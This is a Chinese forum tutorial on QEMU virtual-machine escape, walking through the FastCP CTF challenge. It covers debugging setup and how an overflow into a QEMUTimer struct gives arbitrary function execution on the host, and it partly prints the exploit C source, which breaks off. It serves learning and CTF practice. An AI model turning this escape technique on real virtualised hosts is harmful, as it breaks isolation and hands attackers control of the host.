---
title: qemu逃逸入门及例题复现
url: https://forum.butian.net/share/3913
source: 奇安信攻防社区
date: 2024-12-06
fetch_date: 2025-10-06T19:33:07.204199
---

# qemu逃逸入门及例题复现

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### qemu逃逸入门及例题复现

本文章详细记录了笔者对qemu逃逸的理解，同时复现了两个经典的CTF中的qemu逃逸的题目，详细记录了复现的过程，希望对你学习qemu逃逸有所帮助

常用指令
====
```text
lspci
ls /sys/devices/pci0000\:00/0000\:00\:04.0/
-monitor telnet:127.0.0.1:4444,server,nowait 后 nc 127.0.0.1 4444可以info pci看的更清楚,这个技巧仅限于qemu，发现内核不好使
```
qemu到底在pwn什么
============
- 主要是pwn qemu这个elf文件本身，说是虚拟机但是更像用软件实现虚拟化，qemu文件中有各种各样的函数可以使用，因此泄露之后如何有任意函数执行那么就可以拿到shell
- 远程一般要反弹shell
- 主要是把exp复制到.cpio这个压缩包中，这样就可以在qemu中运行我们所写的攻击脚本
```bash
mkdir exp
cp ./initramfs-busybox-x64.cpio.gz ./exp/
cd exp
gunzip ./initramfs-busybox-x64.cpio.gz
cpio -idmv < ./initramfs-busybox-x64.cpio
mkdir root
cp ../exp.c ./root/
gcc ./root/exp.c -o ./root/exp -static
find . | cpio -o --format=newc > initramfs-busybox-x64.cpio
gzip initramfs-busybox-x64.cpio
cp initramfs-busybox-x64.cpio.gz ..
```
有关调试
====
- 主要有两种调试方法
1. 直接gdb qemu这个文件，然后set args设置启动参数
2. 运行./launch.sh，然后ps -ef | grep qemu，通过gdb -p 进程号就可以连上进行调试了
- 发现想打exp里面的断点很困难，那就把断点打在qemu这个文件中，比如b fastcp\\_mmio\\_write,然后c就行了
基础知识
====
- 有很多前人的参考博客就基本知识就不过多赘述，主要记录自己的一些理解
[入门最好的博客](https://www.anquanke.com/post/id/254906#h3-10)
[一篇简短地讲qemu pwn到底在干什么的博客](https://www.cnblogs.com/JmpCliff/articles/17332921.html)
[很详细地讲了qemu的基础知识](https://xz.aliyun.com/t/6562?time\_\_1311=n4%2BxnD0DRDBAi%3DGkDgiDlhjmYgxIrxQSu0iD&alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-2)
[这篇博客也不错](https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/)
地址转化
----
- 这一点还是比较重要的，只有地址正确才能正确的执行相应的函数
PCI 设备地址空间
----------
- 主要就是MMIO和PMIO，目前只pwn过MMIO的
主要漏洞
----
- 一般的漏洞都是读写的错误，特别是写的越界，因此注意检查size的限制很重要
FastCP
======
[主要参考了这个博客](https://www.anquanke.com/post/id/254906#h3-8)
- 入门qemu逃逸第一题，花了好几天时间才把所有的细节搞明白 题目分析
----
- 题目名字就是fastcp，所以ida直接搜发现这些有关的，一般漏洞也都是因为mmio\\_write，所以开始代码审计，审计过程略
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b0ff8d9d7e1021e25fbc6e4b7479fff94004af79.png)
- 在mmio\\_write这个函数中跟进一个函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-daea1741654ba5a686e1f10a18f2a9598c11e5f4.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-52ab2a96166a8720c92358d9983dc4e82cd72200.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-65332fc2ed53c3173416d3add1550f78470b66f7.png)
\*\*这里的函数执行竟然是通过存储的timer结构体，因此如果可以控制timer结构体意味着就可以任意函数执行\*\*
- 然后就是看是MMIO还是PMIO
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-6abf375dbaa0d27110b6cbfa9a9c2c9fa7941d87.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-f2410b1b02b89adee627b629f39089edb346f568.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-0533b3963a36cebec8625001cf400c8636e07f9a.png)
发现resource0，那就是MMIO了
exp分析
-----
### mmio\\_write与qemu的联系
- 看到qemu中的这个函数就在想这个mmio\\_mem怎么和这个qemu中的这个函数联系起来
- \*\*应该这样理解，通过打开resource0这个设备再映射，那么往mmio\\_mem写入的东西会被这样处理:FastCPState \\*opaque和size这两个参数不用管，往mmio\\_mem写入东西的偏移就是addr,对应偏移的值就是val，这样一切都联系起来了\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-6d5a4589a84455bad59df8adda707962a98debf0.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-8f52af9c4cedd662edc032725ad64529381ecba1.png)
### userbuf和phy\\_userbuf
- 这里要先理解我们写的exp和qemu是两个不同的进程，而我们的最终目的是通过泄露出qemu中的东西然后任意函数执行最终pwn掉qemu这个宿主
- 地址转换这个不多赘述
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-0ec98227185bfc7e9a631d00daa517a3f2763b02.png)
### qemu中的函数和exp中的函数分析
- 主要是fastcp\\_cp\\_timer这个函数,cp\\_info是这个函数的一个局部变量，cp\\_list\\_src要是\*\*phy\\_userbuf才行，因此我们不能在qemu这个进程中访问到exp进程的东西，但是却可以通过phy\\_userbuf访问到。同时我们可以在exp中把想要的数据复制给userbuf，这样就联系起来了\*\*
- cmd=4，把cp\\_list\\_src也就是phy\\_userbuf中的cp\\_info复制给qemu中的cp\\_info这个局部变量，然后把cp\\_buffer中的数据复制给dst
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-6e326326a3b8bc3aba84d5bd4ad070a216a5dd2d.png)
- cmd=2，把src中的值复制给cp\\_buffer
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b350d0c1057e151dbcf5a19f394cd4103a4faad6.png)
- cmd=1，把src的值复制给buf，再把buf的值复制给dst
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-2d7481f06b4e3d8615be986b31c76b864a121989.png)
exp攻击流程
-------
### 任意地址的泄露
- 注意到把buf的值复制到dst时没有长度限制，但是在qemu这个结构体中，buf后面就是timer这个结构体，因此可以把timer结构体的内容泄露
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-d4c941230c197a217b5add2534e086a10c5dfe48.png)
- 看到exp中leak\\_timer = \\*(uint64\\_t\\*)(&amp;userbuf\[0x10\]),这就是通过phy\\_userbuf这个桥梁，在exp进程中获取到了qemu进程的东西
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-ac12bb5f7e9b9f6d55dd9530aef7d8cf19255dcc.png)
### 任意函数的执行
1. 前面说到有cb(opaque)这个任意函数执行，因此设置相应的值就可以
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-0a10f77f88f3bc71cad4acef0a2312177d260776.png)
2. 这里先说说这个struct\\_head是什么，其实就是这个结构体的头部，所以才有timer.opaque = struct\\_head + 0xa00 + 0x1000 + 0x30
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-9019664d89c7702219f501ed47d5b9ed8d093d76.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-e3465284110119dc6d3506433234f3141e25ee75.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-5a5bdddbfb2ec5200884a9d320717ee0fe5ba200.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-bfbc98708b9557bcaf04cd5fe45c8487468eb499.png)
3. 再说说exp中的这部分
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-c76ece96d3a0be8859427087f6240c480833ddb3.png)
- src和dst都是gva\\_to\\_gpa(userbuf + 0x1000) - 0x1000 ，先把src复制到buf,因为len=0x1000 + sizeof(timer)所以buf后面的timer结构体就被修改为我们期望的样子了。后面buf复制到dst其实都不重要了，然后只要让cmd=1，也就是调用fastcp\\_cp\\_timer函数就可以任意函数执行了
- 这里又来了一个知识点，因此虽然是memcpy(userbuf + 0x1000, &amp;timer, sizeof(timer)); 但是后面却是gva\\_to\\_gpa(userbuf + 0x1000) - 0x1000，这是因为多于一页物理地址不一定连续了
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-2371c256044de4ad0095a8874a0e700b1ce3ede0.png)
- exp
```C
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/io.h>
#include <unistd.h>
#define PAGE\_SHIFT 12
#define PAGE\_SIZE (1 << PAGE\_SHIFT)
#define PFN\_PRESENT (1ull << 63)
#define PFN\_PFN ((1ull << 55) - 1)
char\* userbuf;
uint64\_t phy\_userbuf, phy\_userbuf2;
unsigned char\* mmio\_mem;
struct FastCP\_CP\_INFO
{
uint64\_t CP\_src;
uint64\_t CP\_cnt;
uint64\_t CP\_dst;
};
struct QEMUTimer
{
int64\_t expire\_time;
int64\_t timer\_list;
int64\_t cb;
void\* opaque;
int64\_t next;
int attributes;
int scale;
char shell[0x50];
};
void die(const char\* msg)
{
perror(msg);
exit(-1);
}
uint64\_t page\_offset(uint64\_t addr)
{
return addr & ((1 << PAGE\_SHIFT) - 1);
}
uint64\_t gva\_to\_gfn(void\* addr)
{
uint64\_t pme, gfn;
size\_t offset;
int fd = open("/proc/self/pagemap", O\_RDONLY);
if (fd < 0)
{
die("open pagemap");
}
offset = ((uintptr\_t)addr >> 9) & ~7;
lseek(fd, offset, SEEK\_SET);
read(fd, &pme, 8);
if (!(pme & PFN\_PRESENT))
return -1;
gfn = pme & PFN\_PFN;
return gfn;
}
//用户虚拟地址gva到用户物理地址gpa
//先根据用户虚拟地址gva算出，用户所在页号gfn,再根据gfn和offset算出用户物理地址gpa（将gfn和offset位拼起来）
uint64\_t gva\_to\_gpa(void\* addr)
{
uint64\_t gfn = gva\_to\_gfn(addr);
assert(gfn != -1);
return (gfn << ...